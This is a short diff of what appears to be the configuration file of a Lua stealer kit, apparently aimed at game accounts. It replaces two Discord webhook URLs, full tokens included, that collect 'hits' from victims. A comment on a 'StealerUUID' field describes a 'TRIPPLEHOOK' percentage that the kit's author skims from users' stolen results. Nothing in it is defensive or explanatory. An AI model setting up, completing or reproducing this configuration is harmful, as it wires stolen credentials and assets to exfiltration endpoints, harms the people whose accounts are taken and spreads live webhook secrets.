@@ -4,8 +4,8 @@ Usernames = {
     'GaGbySmiley',
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/1388384374051049533/qx_eNWIKnDSJ6tfw5_DJT058ZWbvLDv6SjW0VdB2Wfl3BcwxjWgz58I335lCPJossj9P"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1388384374051049533/qx_eNWIKnDSJ6tfw5_DJT058ZWbvLDv6SjW0VdB2Wfl3BcwxjWgz58I335lCPJossj9P"
+BigHitsWebhook = "https://discord.com/api/webhooks/1401504567291809905/HH_dtdzSJU1SYaGRflZLVq8GJ2tS4aftnZtD2Xq-gbG3HzbT0WuAnqLnlFpk6Tvw93ES"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1401504567291809905/HH_dtdzSJU1SYaGRflZLVq8GJ2tS4aftnZtD2Xq-gbG3HzbT0WuAnqLnlFpk6Tvw93ES"
 
 Config = {
     StealerUUID = 'Write anything u want here, it will be used to decide TRIPPLEHOOK % u will get, i will decide and lower % if u get more hits', -- THIS IS REQUIRED!!!
